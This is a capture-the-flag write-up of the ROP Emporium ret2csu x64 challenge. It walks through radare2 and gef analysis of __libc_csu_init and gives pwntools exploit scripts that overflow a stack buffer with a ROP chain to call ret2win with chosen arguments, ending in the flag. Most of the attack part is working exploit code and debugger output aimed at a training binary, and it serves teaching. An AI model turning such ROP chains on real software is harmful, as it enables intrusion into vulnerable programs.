---
layout: single
title:  "ROP Emporium - Ret2csu (x64)"
date:   2020-10-17
excerpt: "ret2csu was a tough challenge from the rop emporium that required the pwner to call an imported function with three arguments in a tiny executable. The caveat was that there was no obvious gadget to set the third argument. Therefore, the pwner had to return to the `__libc_csu_init` function to set the RDX register with a mov instruction. As much as this works in practice, it also has numerous side effects that require comensation to get the final exploit to work."
categories:
  - ctf
  - infosec
tags:
  - binary exploitation
  - exploit development
  - defeating non-executable stacks
  - rop chaining
  - universal rop chaining
  - aslr
  - ret2csu
---

## Summary

ret2csu was a tough challenge from the rop emporium that required the pwner to call an imported function with three arguments in a tiny executable. The caveat was that there was no obvious gadget to set the third argument. Therefore, the pwner had to return to the `__libc_csu_init` function to set the `RDX` register with a `mov` instruction. As much as this works in practice, it also has numerous side effects that require comensation to get the final exploit to work. You can read more on the challenge [here](https://ropemporium.com/challenge/ret2csu.html).

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec ret2csu
[*] '/home/kali/ctf/rop-emporium/ret2csu/x64/ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libret2csu.so` shared object file that links to the executable upon runtime:

```
$ ldd ret2csu
        linux-vdso.so.1 (0x00007ffc207ac000)
        libret2csu.so => ./libret2csu.so (0x00007fcc8c5a7000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcc8c3c8000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fcc8c7ac000)
```

## The Challenge Layout

This challenge came bundled with the following files:

```
encrypted_flag.dat  key.dat  libret2csu.so  ret2csu
```

Given this layout, it looks like we may need to invoke some function from `libret2csu.so` to decrypt the `encrypted_flag.dat` file.

## Goals

Call `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`.

## Treasure Hunting

Analyzing `ret2csu` reveals the following:

```
$ r2 ret2csu
[0x00400520]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

```
[0x00400520]> afl
0x00400520    1 42           entry0
0x004004d0    3 23           sym._init
0x004006b4    1 9            sym._fini
0x00400560    4 42   -> 37   sym.deregister_tm_clones
0x00400590    4 58   -> 55   sym.register_tm_clones
0x004005d0    3 34   -> 29   entry.fini0
0x00400600    1 7            entry.init0
0x00400617    1 27           sym.usefulFunction
0x00400510    1 6            sym.imp.ret2win
0x004006b0    1 2            sym.__libc_csu_fini
0x00400640    4 101          sym.__libc_csu_init
0x00400550    1 2            sym._dl_relocate_static_pie
0x00400607    1 16           main
0x00400500    1 6            sym.imp.pwnme
```

Let's disassemble `usefulFunction`:

```
[0x00400520]> pd @sym.usefulFunction
┌ 27: sym.usefulFunction ();
│           0x00400617      55             push rbp
│           0x00400618      4889e5         mov rbp, rsp
│           0x0040061b      ba03000000     mov edx, 3
│           0x00400620      be02000000     mov esi, 2
│           0x00400625      bf01000000     mov edi, 1
│           0x0040062a      e8e1feffff     call sym.imp.ret2win
│           0x0040062f      90             nop
│           0x00400630      5d             pop rbp
└           0x00400631      c3             ret
```

As useful as `usefulFunction` looks, it calls `ret2win(1,2,3)` which is close, but not quite what we want.

Therefore, if we wish to call `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, we need a way to control the `RDI`, `RSI`, and `RDX` registers.

If we continue to analyze `ret2csu`, we'll notice that we can only find gadgets for popping stack values into the `RDI` and `RSI` registers:

```
[0x00400520]> /R pop rdi
  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret

[0x00400520]> /R pop rsi
  0x004006a1                 5e  pop rsi
  0x004006a2               415f  pop r15
  0x004006a4                 c3  ret

[0x00400520]> /R pop rdx
[0x00400520]>
```

Unfortunately, we could not find a single `pop rdx` gadget.
Interestingly, on `x86_64` ELF files, it is possible to leverage the `__libc_csu_init()` function as a location for setting most CPU registers with ROP chaining.
Let's disassemble `__libc_csu_init()` in `ret2csu`:

```
[0x00400520]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
... CONTENT SNIPPED ...
55   0x00000640 0x00400640 GLOBAL FUNC   101      __libc_csu_init
... CONTENT SNIPPED ...

[0x00400520]> pd @0x00400640
            ; DATA XREF from entry0 @ 0x400536
┌ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
│           ; arg int64_t arg1 @ rdi
│           ; arg int64_t arg2 @ rsi
│           ; arg int64_t arg3 @ rdx
│           0x00400640      4157           push r15
│           0x00400642      4156           push r14
│           0x00400644      4989d7         mov r15, rdx                ; arg3
│           0x00400647      4155           push r13
│           0x00400649      4154           push r12
│           0x0040064b      4c8d259e0720.  lea r12, qword obj.__frame_dummy_init_array_entry ; loc.__init_array_start
│                                                                      ; 0x600df0
│           0x00400652      55             push rbp
│           0x00400653      488d2d9e0720.  lea rbp, qword obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
│                                                                      ; 0x600df8
│           0x0040065a      53             push rbx
│           0x0040065b      4189fd         mov r13d, edi               ; arg1
│           0x0040065e      4989f6         mov r14, rsi                ; arg2
│           0x00400661      4c29e5         sub rbp, r12
│           0x00400664      4883ec08       sub rsp, 8
│           0x00400668      48c1fd03       sar rbp, 3
│           0x0040066c      e85ffeffff     call sym._init
│           0x00400671      4885ed         test rbp, rbp
│       ┌─< 0x00400674      7420           je 0x400696
│       │   0x00400676      31db           xor ebx, ebx
│       │   0x00400678      0f1f84000000.  nop dword [rax + rax]
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400694
│      ┌──> 0x00400680      4c89fa         mov rdx, r15
│      ╎│   0x00400683      4c89f6         mov rsi, r14
│      ╎│   0x00400686      4489ef         mov edi, r13d
│      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
│      ╎│   0x0040068d      4883c301       add rbx, 1
│      ╎│   0x00400691      4839dd         cmp rbp, rbx
│      └──< 0x00400694      75ea           jne 0x400680
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
│       └─> 0x00400696      4883c408       add rsp, 8
│           0x0040069a      5b             pop rbx
│           0x0040069b      5d             pop rbp
│           0x0040069c      415c           pop r12
│           0x0040069e      415d           pop r13
│           0x004006a0      415e           pop r14
│           0x004006a2      415f           pop r15
└           0x004006a4      c3             ret
            0x004006a5      90             nop
            0x004006a6      662e0f1f8400.  nop word cs:[rax + rax]
... CONTENT SNIPPED ...
```

Since we need to populate the `RDX` register, we can use the ROP gadget at memory address `0x00400680`.
This gadget will clobber some of our dependent registers (`RDI`, and `RSI`), so we need to be a bit clever when invoking that gadget.
Let's map out the dependency graph. The registers on the very left have no dependencies since we can directly use the ROP gadget at `0x0040069a` to set them:

```
R15 = RDX = 0xd00df00dd00df00d
R14 = RSI = 0xcafebabecafebabe
R13 = RDI = 0xdeadbeefdeadbeef
R12 = Address to dereference and call
RBX = 0x0
```

Now for the toughest part of the challenge: the `call qword [r12 + rbx*8]` instruction calls a function located at the memory address pointed to by `r12 + rbx * 8`.
Since we need to execute a value that is the pointee of a memory address, we have a couple options:

1. Write the address of our choice to a writeable segment and use the writable segment as the address to dereference.
2. Push an arbitrary value on the stack so `r12 + rbx*8` points to it. The arbitrary stack value should therefore point to `ret2win`.
3. Search for data in the ELF file that contains byte sequences that represent valid addresses to executable code.

For this challenge, only the third approach will work.

Since we need to `r12 + rbx*8` to derefence a value, let's find an address that will dereference to a location that will not clobber the RDX register.
The `radare2` command below uses uses a regex search to seek the next value in the ELF with byte sequences starting with any two bytes followed by `\x00\x40`.
We search for that byte prefix because most executable addresses representing valid machine instructions are located at slight offsets from `0x00400000`.
This will take some trial and error, so be sure to examine how the ROP gadgets look like each time you seek a new address.

```
[0x00600e38]> s/e /..\x40\x00/i
Invalid argument
Searching 8 bytes in [0x601038-0x601040]
hits: 0
Searching 8 bytes in [0x600e39-0x601038]
0x00600e48 hit114_0 .@\u00b4\u0006@\u0000\u0000\u0000\u0000\u0000`.
```

Examining this value in little-endian (just like we would in GDB), we notice that dereferencing `0x00600e48` leads us to `0x00000000004006b4`.

```
[0x00600e48]> x/xg
0x00600e48  0x00000000004006b4                       ..@.....
```

Disassembling `0x00000000004006b4`, we notice that it leads to the following section of code:

```
[0x00600e48]> pd 3 @0x00000000004006b4
            ;-- section..fini:
            ;-- .fini:
┌ 9: sym._fini ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
│           0x004006b4      4883ec08       sub rsp, 8                  ; [14] -r-x section size 9 named .fini
│           0x004006b8      4883c408       add rsp, 8
└           0x004006bc      c3             ret
```

This section of code is equivalent to a `ret` instruction because the stack pointer shifts nullify each other.
Therefore, we should be able to resume our ROP chain and finally call `ret2win`.

With what we have so far, let's run the following exploit:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './ret2csu'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x0040069a"
pid = gdb.attach(io, gdbscript=gdbscript)

# ROP Gadgets
pop_rdi_ret = p64(0x004006a3)                       # pop rdi; ret;

# The third stack value needs to be the RSP value
ret2csu_gadget_staging = p64(0x0040069a)            # pop rbx;
                                                    # pop rbp;
                                                    # pop r12;
                                                    # pop r13;
                                                    # pop r14;
                                                    # pop r15;
                                                    # ret

ret2csu_gadget_call_offset = p64(0x00400680)        # mov rdx, r15; 
                                                    # mov rsi, r14;
                                                    # mov edi, r13d;
                                                    # call qword [r12 + rbx*8]

'''
Pointer to an executable location with the following gadget:

sub rsp, 8;
add rsp, 8;
ret;
'''
dereferenceable_addr = p64(0x00600e48)
ret2win = p64(io.elf.plt['ret2win'])

# Craft the ROP chain
rop_chain = b"".join([
    ret2csu_gadget_staging,
    p64(0),                     # RBX = 0
    p64(0),                     # RBP = 0
    dereferenceable_addr,       # R12 = pointer to a safe address to dereference
    p64(0xdeadbeefdeadbeef),    # R13 = RDI = 0xdeadbeefdeadbeef
    p64(0xcafebabecafebabe),    # R14 = RSI = 0xcafebabecafebabe
    p64(0xd00df00dd00df00d),    # R15 = RDX = 0xd00df00dd00df00d
    ret2csu_gadget_call_offset, # Call the value of the dereferenced address

    pop_rdi_ret,                # Adjust RDI back to 0xdeadbeefdeadbeef
    p64(0xdeadbeefdeadbeef),
    ret2win                     # Call ret2win with the necessary arguments
])

# Craft the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop_chain
])

# Send the payload
io.clean()
io.sendline(payload)
io.interactive()
```

Tracing the code's execution, we eventually end up returning back to the caller function.
This is the main difference between a `call` and a `jmp` instruction. Therefore, when execution resumes, we should take care to return with minimal side effects.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f46e0b2bff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0xd00df00dd00df00d
$rsp   : 0x00007ffdfac3e7e0  →  0x000000000040068d  →  <__libc_csu_init+77> add rbx, 0x1
$rbp   : 0x0               
$rsi   : 0xcafebabecafebabe
$rdi   : 0xdeadbeef        
$rip   : 0x00000000004006bc  →  <_fini+8> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff249
$r11   : 0x246             
$r12   : 0x0000000000600e48  →  0x00000000004006b4  →  <_fini+0> sub rsp, 0x8
$r13   : 0xdeadbeefdeadbeef
$r14   : 0xcafebabecafebabe
$r15   : 0xd00df00dd00df00d
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffdfac3e7e0│+0x0000: 0x000000000040068d  →  <__libc_csu_init+77> add rbx, 0x1     ← $rsp
0x00007ffdfac3e7e8│+0x0008: 0x00000000004006a3  →  <__libc_csu_init+99> pop rdi
0x00007ffdfac3e7f0│+0x0010: 0xdeadbeefdeadbeef
0x00007ffdfac3e7f8│+0x0018: 0x0000000000400510  →  <ret2win@plt+0> jmp QWORD PTR [rip+0x200b0a]        # 0x601020 <ret2win@got.plt>
0x00007ffdfac3e800│+0x0020: 0x000000000000000a
0x00007ffdfac3e808│+0x0028: 0x0000000000000000
0x00007ffdfac3e810│+0x0030: 0x1a0d7e1c78e1e0cf
0x00007ffdfac3e818│+0x0038: 0x1b7b4ad7ce67e0cf
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4006b2                  add    BYTE PTR [rax], al
     0x4006b4 <_fini+0>        sub    rsp, 0x8
     0x4006b8 <_fini+4>        add    rsp, 0x8
 →   0x4006bc <_fini+8>        ret    
   ↳    0x40068d <__libc_csu_init+77> add    rbx, 0x1
        0x400691 <__libc_csu_init+81> cmp    rbp, rbx
        0x400694 <__libc_csu_init+84> jne    0x400680 <__libc_csu_init+64>
        0x400696 <__libc_csu_init+86> add    rsp, 0x8
        0x40069a <__libc_csu_init+90> pop    rbx
        0x40069b <__libc_csu_init+91> pop    rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2csu", stopped 0x4006bc in _fini (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006bc → _fini()
[#1] 0x40068d → __libc_csu_init()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

If we continue to step a little bit more through the execution, we will notice that we should set the RBP register to `0x1` so that we won't take the conditional jump. 
We should also take care to align the stack properly since the stack pointer will be offset by `-0x8` bytes and will then pop 6 values.

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x1               
$rcx   : 0x00007f46e0b2bff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0xd00df00dd00df00d
$rsp   : 0x00007ffdfac3e7e8  →  0x00000000004006a3  →  <__libc_csu_init+99> pop rdi
$rbp   : 0x0               
$rsi   : 0xcafebabecafebabe
$rdi   : 0xdeadbeef        
$rip   : 0x0000000000400691  →  <__libc_csu_init+81> cmp rbp, rbx
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0xfffffffffffff249
$r11   : 0x246             
$r12   : 0x0000000000600e48  →  0x00000000004006b4  →  <_fini+0> sub rsp, 0x8
$r13   : 0xdeadbeefdeadbeef
$r14   : 0xcafebabecafebabe
$r15   : 0xd00df00dd00df00d
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffdfac3e7e8│+0x0000: 0x00000000004006a3  →  <__libc_csu_init+99> pop rdi  ← $rsp
0x00007ffdfac3e7f0│+0x0008: 0xdeadbeefdeadbeef
0x00007ffdfac3e7f8│+0x0010: 0x0000000000400510  →  <ret2win@plt+0> jmp QWORD PTR [rip+0x200b0a]        # 0x601020 <ret2win@got.plt>
0x00007ffdfac3e800│+0x0018: 0x000000000000000a
0x00007ffdfac3e808│+0x0020: 0x0000000000000000
0x00007ffdfac3e810│+0x0028: 0x1a0d7e1c78e1e0cf
0x00007ffdfac3e818│+0x0030: 0x1b7b4ad7ce67e0cf
0x00007ffdfac3e820│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400685 <__libc_csu_init+69> test   BYTE PTR [rcx+rcx*4-0x11], 0x41
     0x40068a <__libc_csu_init+74> call   QWORD PTR [rsp+rbx*8]
     0x40068d <__libc_csu_init+77> add    rbx, 0x1
 →   0x400691 <__libc_csu_init+81> cmp    rbp, rbx
     0x400694 <__libc_csu_init+84> jne    0x400680 <__libc_csu_init+64>
     0x400696 <__libc_csu_init+86> add    rsp, 0x8
     0x40069a <__libc_csu_init+90> pop    rbx
     0x40069b <__libc_csu_init+91> pop    rbp
     0x40069c <__libc_csu_init+92> pop    r12
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2csu", stopped 0x400691 in __libc_csu_init (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400691 → __libc_csu_init()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  disas $rip
Dump of assembler code for function __libc_csu_init:
   0x0000000000400640 <+0>:     push   r15
   0x0000000000400642 <+2>:     push   r14
   0x0000000000400644 <+4>:     mov    r15,rdx
   0x0000000000400647 <+7>:     push   r13
   0x0000000000400649 <+9>:     push   r12
   0x000000000040064b <+11>:    lea    r12,[rip+0x20079e]        # 0x600df0
   0x0000000000400652 <+18>:    push   rbp
   0x0000000000400653 <+19>:    lea    rbp,[rip+0x20079e]        # 0x600df8
   0x000000000040065a <+26>:    push   rbx
   0x000000000040065b <+27>:    mov    r13d,edi
   0x000000000040065e <+30>:    mov    r14,rsi
   0x0000000000400661 <+33>:    sub    rbp,r12
   0x0000000000400664 <+36>:    sub    rsp,0x8
   0x0000000000400668 <+40>:    sar    rbp,0x3
   0x000000000040066c <+44>:    call   0x4004d0 <_init>
   0x0000000000400671 <+49>:    test   rbp,rbp
   0x0000000000400674 <+52>:    je     0x400696 <__libc_csu_init+86>
   0x0000000000400676 <+54>:    xor    ebx,ebx
   0x0000000000400678 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400680 <+64>:    mov    rdx,r15
   0x0000000000400683 <+67>:    mov    rsi,r14
   0x0000000000400686 <+70>:    mov    edi,r13d
   0x0000000000400689 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:    add    rbx,0x1
=> 0x0000000000400691 <+81>:    cmp    rbp,rbx
   0x0000000000400694 <+84>:    jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:    add    rsp,0x8
   0x000000000040069a <+90>:    pop    rbx
   0x000000000040069b <+91>:    pop    rbp
   0x000000000040069c <+92>:    pop    r12
   0x000000000040069e <+94>:    pop    r13
   0x00000000004006a0 <+96>:    pop    r14
   0x00000000004006a2 <+98>:    pop    r15
   0x00000000004006a4 <+100>:   ret    
End of assembler dump.
```

After making the adjustments recommended above, the new exploit code looks like the following:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './ret2csu'
io = process(PROCESS)

# Debugging
'''
gdbscript = "b *0x0040069a"
pid = gdb.attach(io, gdbscript=gdbscript)
'''

# ROP Gadgets
pop_rdi_ret = p64(0x004006a3)                       # pop rdi; ret;

# The third stack value needs to be the RSP value
ret2csu_gadget_staging = p64(0x0040069a)            # pop rbx;
                                                    # pop rbp;
                                                    # pop r12;
                                                    # pop r13;
                                                    # pop r14;
                                                    # pop r15;
                                                    # ret

ret2csu_gadget_call_offset = p64(0x00400680)        # mov rdx, r15; 
                                                    # mov rsi, r14;
                                                    # mov edi, r13d;
                                                    # call qword [r12 + rbx*8]

'''
Pointer to an executable location with the following gadget:

sub rsp, 8;
add rsp, 8;
ret;
'''
dereferenceable_addr = p64(0x00600e48)
ret2win = p64(io.elf.plt['ret2win'])


'''
R15 = RDX = 0xd00df00dd00df00d
R14 = RSI = 0xcafebabecafebabe
R13 = RDI = 0xdeadbeefdeadbeef
R12 = 0x00600e48
RBX = 0x0
'''

# Craft the ROP chain
rop_chain = b"".join([
    ret2csu_gadget_staging,
    p64(0),                     # RBX = 0
    p64(0x01),                  # RBP = 0x01; this is important so that we can avoid the conditional jump in __libc_csu_init after calling the dereferenced address
    dereferenceable_addr,       # R12 = pointer to a safe address to dereference
    p64(0xdeadbeefdeadbeef),    # R13 = RDI = 0xdeadbeefdeadbeef
    p64(0xcafebabecafebabe),    # R14 = RSI = 0xcafebabecafebabe
    p64(0xd00df00dd00df00d),    # R15 = RDX = 0xd00df00dd00df00d
    ret2csu_gadget_call_offset, # Call the value of the dereferenced address

    p64(0),                     # Align the stack so that after the values pop, we still have control of it
    p64(0),                     
    p64(0),                     
    p64(0),                     
    p64(0),                     
    p64(0),                     
    p64(0),                     

    pop_rdi_ret,                # Adjust RDI back to 0xdeadbeefdeadbeef
    p64(0xdeadbeefdeadbeef),
    ret2win                     # Call ret2win with the necessary arguments
])

# Craft the payload
offset = 40
padding = b"A" * offset
payload = b"".join([
    padding,
    rop_chain
])

# Send the payload
io.clean()
io.sendline(payload)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './ret2csu' argv=[b'./ret2csu'] : pid 5951
[DEBUG] PLT 0x400500 pwnme
[DEBUG] PLT 0x400510 ret2win
[*] '/home/kali/ctf/rop-emporium/ret2csu/x64/ret2csu'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[DEBUG] Received 0x8c bytes:
    b'ret2csu by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n'
    b'\n'
    b'> '
[DEBUG] Sent 0xb9 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  9a 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  00 00 00 00  00 00 00 00  01 00 00 00  00 00 00 00  │····│····│····│····│
    00000040  48 0e 60 00  00 00 00 00  ef be ad de  ef be ad de  │H·`·│····│····│····│
    00000050  be ba fe ca  be ba fe ca  0d f0 0d d0  0d f0 0d d0  │····│····│····│····│
    00000060  80 06 40 00  00 00 00 00  00 00 00 00  00 00 00 00  │··@·│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    000000a0  a3 06 40 00  00 00 00 00  ef be ad de  ef be ad de  │··@·│····│····│····│
    000000b0  10 05 40 00  00 00 00 00  0a                        │··@·│····│·│
    000000b9
[*] Switching to interactive mode
[*] Process './ret2csu' stopped with exit code 0 (pid 5951)
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

And we get the flag!
